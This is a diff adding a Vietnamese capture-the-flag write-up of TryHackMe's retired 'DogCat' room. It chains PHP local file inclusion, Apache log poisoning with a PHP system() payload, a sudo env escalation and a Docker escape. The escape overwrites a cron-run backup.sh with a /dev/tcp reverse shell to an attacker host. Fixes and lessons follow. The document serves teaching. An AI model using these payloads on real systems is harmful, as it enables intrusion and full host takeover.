@@ -1,6 +1,6 @@
 ---
 title: 'DogCat'
-description: '[[THIẾU MÔ TẢ]]'
+description: 'Từ một lỗ hổng PHP LFI ở tham số ?view= tới RCE qua log poisoning, rồi root trong container và một cú Docker escape ra host.'
 date: 2026-10-05
 platform: tryhackme
 room: 'DogCat'
@@ -9,8 +9,181 @@ difficulty: medium
 tags: [web, php, lfi, log poisoning, docker escape, sudo]
 vulnClasses:
   [Local File Inclusion, Remote Code Execution, SUID / Sudo Misconfiguration, Container Escape]
-translation: pending
-draft: true
+translation: done
+draft: false
 ---
 
-Bản dịch tiếng Việt đang được chuẩn bị. Đọc bản tiếng Anh.
+## TryHackMe: DogCat — Từ một tham số `?view=` tới root trên Docker host
+
+_Lời giải phòng "DogCat". Một lệnh PHP_ _`include()`_ _cẩu thả biến một request HTTP ẩn danh thành một cú chiếm trọn host: local file inclusion thành đọc file tùy ý, rồi thực thi mã từ xa qua log poisoning, rồi root trong container qua một lỗi sudo, và cuối cùng là một cú Docker escape lên root trên host._
+
+> Các giá trị flag đã được che. DogCat là một phòng luyện tập đã retired trên TryHackMe; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập được phép.
+
+---
+
+### TL;DR — toàn bộ chuỗi trong một dòng
+
+<Callout type="tldr">
+
+`?view=` LFI → đọc file tùy ý → đầu độc access-log của Apache → RCE với tư cách `www-data` → `sudo env` → root trong container → file `backup.sh` ghi-được chạy bởi cron của root → **root trên host**.
+
+Bốn mức đặc quyền, bốn flag, và thứ duy nhất bạn cần để bắt đầu là khả năng gửi request HTTP tới site.
+
+</Callout>
+
+### Mục tiêu
+
+```text
+export IP=<target-ip>
+nmap -sC -sV -p- -T4 --min-rate=1000 $IP
+```
+
+```text
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))   # title: "dogcat"
+```
+
+Chỉ có SSH và một website. Site là một phòng trưng bày nhỏ hiện cho bạn một con chó hoặc con mèo. Phần thú vị là URL: `/?view=dog`. Bất cứ khi nào một web app nhận một giá trị trông-giống-tên-file trong query string, bạn nên lập tức tự hỏi nó làm gì với giá trị đó.
+
+### Nguyên nhân gốc: input người dùng chảy vào `include()`
+
+Ta sẽ phục hồi mã nguồn ở Giai đoạn 1, nhưng đáng xem lỗi trước. Hàm xử lý phòng trưng bày trông như sau:
+
+```text
+function containsStr($str, $substr) {
+    return strpos($str, $substr) !== false;
+}
+$ext= isset($_GET["ext"]) ? $_GET["ext"] : '.php';   // extension is attacker-controlled
+if (isset($_GET['view'])) {
+    if (containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+        echo 'Here you go!';
+        include $_GET['view'] . $ext;                 // user input -> include()
+    } else {
+        echo 'Sorry, only dogs or cats are allowed.';
+    }
+}
+```
+
+Hai lỗi kết hợp thành một primitive mạnh:
+
+1. Hàng rào duy nhất là kiểm tra chuỗi con `dog` hoặc `cat` ở **bất kỳ đâu** trong đường dẫn. Điều đó thỏa mãn dễ dàng với thứ như `dogs/../`.
+2. `ext` được đọc từ query string, nên hậu tố `.php` ghi cứng — thứ duy nhất lẽ ra buộc mọi include phải là file PHP — bị hủy chỉ bằng cách gửi `&ext=` (rỗng).
+
+Gộp lại: ta có thể khiến app `include()` bất kỳ đường dẫn nào ta muốn, với bất kỳ (hoặc không có) phần mở rộng. Đó là Local File Inclusion.
+
+### Giai đoạn 1 — LFI để lấy mã nguồn và đọc file tùy ý _(ẩn danh)_
+
+Trước hết, đọc mã nguồn của chính app bằng wrapper `php://filter`, thứ trả về một file được mã hóa base64 thay vì thực thi nó. Một `dog` được lén đưa vào đường dẫn để qua bộ lọc chuỗi con:
+
+```text
+curl -s "http://$IP/?view=php://filter/convert.base64-encode/resource=./dog/../index"
+# -> a base64 blob = the full source of index.php
+```
+
+Giải mã nó và bạn có đoạn code lỗi ở trên. Giờ làm rỗng `ext` và include trở thành một phép đọc file thuần — thẳng vào `/etc/passwd`:
+
+```text
+curl -s "http://$IP/?view=dog/../../../../../../etc/passwd&ext="
+# root:x:0:0:root:/root:/bin/bash
+# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+# ...
+```
+
+Flag đầu tiên nằm trong mã nguồn của `flag.php`, cũng đọc qua bộ lọc base64 (giá trị đã che).
+
+**Primitive thu được:** đọc mọi file mà người dùng web server với tới được.
+
+### Giai đoạn 2 — Log poisoning biến "đọc" thành "thực thi" _(www-data)_
+
+Đọc file thì tốt, nhưng ta muốn thực thi mã. Bước chuyển kinh điển: access log của Apache đọc-được-bởi-mọi-người và lưu nguyên văn header `User-Agent`. Nên ta ghi PHP _vào_ log bằng cách gửi nó làm User-Agent, rồi `include` cái log bằng chính LFI đó:
+
+```text
+# 1) plant PHP in the access log via the User-Agent header
+curl -s "http://$IP/" -A "<?php system(\$_GET['c']); ?>"
+
+# 2) include the log, and pass a shell command in c=
+curl -s "http://$IP/?view=dog/../../../../../../var/log/apache2/access.log&ext=&c=id"
+# ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Primitive đọc vừa trở thành một shell.
+
+**Primitive thu được:** thực thi lệnh tùy ý với tư cách `www-data`.
+
+### Giai đoạn 3 — Root trong container qua một lỗi sudo _(root, trong container)_
+
+Mỗi khi có shell, hãy kiểm tra quyền sudo:
+
+```text
+sudo -l
+# User www-data may run the following commands on a4d1fcae8209:
+#     (root) NOPASSWD: /usr/bin/env
+```
+
+`www-data` có thể chạy `/usr/bin/env` với tư cách root không cần mật khẩu. [GTFOBins](https://gtfobins.github.io/gtfobins/env/) ghi rằng `env` có thể khởi chạy một chương trình — nên trỏ nó vào một shell và nó trao cho bạn root:
+
+```text
+sudo env /bin/bash
+# id -> uid=0(root)
+```
+
+Root trong container mở khóa flag 2 và 3 (một trong webroot, một trong `/root` mà `www-data` không đọc được). Nhưng hostname `a4d1fcae8209` và một file `/.dockerenv` cho ta biết ta đang bị nhốt trong một container. Gợi ý của flag 3 nói thẳng: _các môi trường khác nhau_. Ta là root — nhưng chưa phải trên máy thật.
+
+### Giai đoạn 4 — Thoát khỏi container lên root trên host _(root, trên host)_
+
+Cú thoát ẩn trong bảng mount. `/opt/backups` được bind-mount từ đĩa thật của host — một cánh cửa chung giữa container và host:
+
+```text
+cat /proc/mounts | grep backups
+# /dev/nvme1n1p2 /opt/backups ext4 rw,relatime   <- shared with the host
+
+cat /opt/backups/backup.sh
+# #!/bin/bash
+# tar cf /root/container/backup/backup.tar /root/container
+
+ls -la /opt/backups/backup.tar   # the mtime advances every minute
+```
+
+Chi tiết cuối đó là toàn bộ cuộc chơi: timestamp của file backup cập nhật mỗi phút, nghĩa là **một cron job trên host đang chạy** **`backup.sh`** **với tư cách root** — và script nằm trên một mount ta ghi được. Nên ta ghi đè nó bằng một reverse shell và chờ một nhịp:
+
+```text
+# on the attacker box:
+nc -lnvp 4444
+
+# in the container root shell, replace backup.sh:
+echo '#!/bin/bash
+bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > /opt/backups/backup.sh
+
+# ~1 minute later a root shell lands on the listener — this time on the HOST
+cat /root/flag4.txt        # final flag (redacted)
+```
+
+**Chiếm trọn:** một cú thoát container-sang-host qua một script ghi-được, được cron của root lập lịch, trên một mount dùng chung. Tham số `?view=` của một phòng trưng bày giờ sở hữu toàn bộ máy.
+
+### Mức độ nghiêm trọng
+
+<Callout type="critical">
+
+**CVSS 3.1 — 9.8 (Tới hạn)** · `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`. Với tới qua mạng, không cần xác thực, không cần tương tác người dùng, và phạm vi thay đổi: web app lỗi dẫn tới chiếm trọn host nó chạy trên. Mất hoàn toàn tính bí mật, toàn vẹn, và sẵn sàng.
+
+</Callout>
+
+### Khắc phục — bất kỳ một mắt xích nào bị chặn là phá cả chuỗi
+
+<Callout type="fix">
+
+1. **Lệnh** **`include()`** — không bao giờ truyền input người dùng vào `include`. Ánh xạ `view` sang một allow-list các file đã biết (`['dog' => 'dog.php', ...]`), bỏ `ext` do người dùng kiểm soát, và đặt `allow_url_include=Off` để diệt việc lạm dụng wrapper.
+2. **Log bị phơi ra** — giữ `/var/log` không đọc được với người dùng web; một khi include đã được allow-list, log poisoning dù sao cũng chết (phòng thủ nhiều lớp).
+3. **Quy tắc sudo** — xóa `NOPASSWD: /usr/bin/env`. Một binary sinh-shell được cấp với tư cách root _chính là_ root.
+4. **Ranh giới container** — đừng bind-mount một thư mục mà cron root của host thực thi vào một container có thể ghi vào nó. Chạy job từ một đường dẫn container không chạm được, mount nó read-only, và hạ đặc quyền.
+
+</Callout>
+
+### Điểm rút ra
+
+- **Một tên file trong URL là một câu hỏi bạn phải trả lời.** `?view=` hét lên LFI; mọi thứ phía sau đến từ việc thử đúng một tham số đó.
+- **Đọc file và thực thi mã gần nhau hơn vẻ ngoài.** Log poisoning (hoặc `php://filter`, `data://`, file session, `/proc/self/environ`) thường xuyên bắc cầu giữa hai thứ.
+- **Có root không có nghĩa là xong — kiểm tra root** _**nào**_. `/.dockerenv`, hostname, và bảng mount cho bạn biết bạn có đang trong container không và tường mỏng ở đâu.
+- **Mount dùng chung cộng cron root bằng kết thúc trận đấu.** Một script ghi-được được host thực thi với tư cách root là cú thoát container sạch nhất có thể.
+
+Cảm ơn bạn đã đọc. DogCat là một phòng tuyệt vời chính vì mỗi giai đoạn là một _lớp_ lỗi khác nhau — inclusion, log poisoning, sudo, container escape — nên hoàn thành nó nghĩa là bạn thật sự hiểu bốn kỹ thuật, không phải một exploit.
